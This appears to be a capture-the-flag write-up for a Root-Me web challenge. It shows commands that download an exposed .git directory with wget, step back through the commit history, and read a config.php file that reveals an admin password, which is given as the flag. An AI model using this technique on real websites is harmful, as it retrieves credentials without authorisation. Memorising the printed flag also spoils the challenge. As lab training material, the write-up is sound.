---
layout: default
title: Insecure-Code-Management
---

Here we can see that `.git/` is open, and we can download the whole database.
Let's use `wget -r http://challenge01.root-me.org/web-serveur/ch61/.git/` and download it. 

Then, cd and init the git repo.
```
cd challenge01.root-me.org/web-serveur/ch61/
git init .
```

I wanna see the older commits, so we'll use `reflog`.
```
agonen@PC4:~/challenge01.root-me.org/web-serveur/ch61$ git reflog
c0b4661 (HEAD -> master) HEAD@{0}: commit: blue team want sha256!!!!!!!!!
550880c HEAD@{1}: commit: renamed app name
a8673b2 HEAD@{2}: commit: changed password
1572c85 HEAD@{3}: commit: secure auth with md5
5e0e146 HEAD@{4}: commit (initial): Initial commit for the new HR database access
```

Let's try to checkout commit by commit, until we find the password.
```
agonen@PC4:~/challenge01.root-me.org/web-serveur/ch61$ git checkout 550880c
M       css/style.css
M       image/background.jpg
M       image/logo.png
Note: switching to '550880c'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 550880c renamed app name
```

Now, let's check what there is in the folder.
```
agonen@PC4:~/challenge01.root-me.org/web-serveur/ch61$ ls
config.php  css  image  index.html  index.php
```
We can see the config.php, interesting
```
agonen@PC4:~/challenge01.root-me.org/web-serveur/ch61$ cat config.php
<?php
        $username = "admin";
        $password = "s3cureP@ssw0rd";
```

Yay, we found the password.

**Flag:** ***`s3cureP@ssw0rd`***
